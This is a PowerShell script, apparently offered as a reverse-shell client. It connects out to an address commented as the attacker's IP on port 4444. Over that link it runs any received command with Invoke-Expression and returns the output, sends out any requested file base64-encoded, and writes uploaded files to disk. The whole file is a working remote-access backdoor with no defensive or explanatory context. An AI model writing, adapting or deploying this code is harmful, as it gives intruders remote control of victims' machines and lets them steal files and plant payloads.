# client.ps1

$ip = "192.168.1.10" # Replace with the attacker's IP address
$port = 4444         # Replace with the attacker's listening port
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

while ($true) {
    $writer.Write("PS> ")
    $writer.Flush()
    $cmd = $reader.ReadLine()

    if ($cmd -eq "exit") { break }
    
    # Handle file download command
    elseif ($cmd.StartsWith("Get-Content")) {
        try {
            $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
            $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
            $response = [Convert]::ToBase64String($fileBytes)
        } catch {
            $response = "Error: Unable to read file - " + $_.Exception.Message
        }
        $writer.WriteLine($response)
        $writer.Flush()
    }

    # Handle file upload command
    elseif ($cmd.StartsWith("Set-Content")) {
        try {
            $pattern = "Set-Content -Path (.+) -Value \[System.Convert\]::FromBase64String'(.+)' -Encoding Byte"
            if ($cmd -match $pattern) {
                $filePath = $matches[1]
                $fileContentBase64 = $matches[2]
                $fileBytes = [Convert]::FromBase64String($fileContentBase64)
                [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                $response = "File uploaded successfully to $filePath"
            } else {
                $response = "Error: Invalid upload command format."
            }
        } catch {
            $response = "Error: Unable to write file - " + $_.Exception.Message
        }
        $writer.WriteLine($response)
        $writer.Flush()
    }

    else {
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
        } catch {
            $writer.WriteLine("Error: " + $_.Exception.Message)
            $writer.Flush()
        }
    }
}

$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
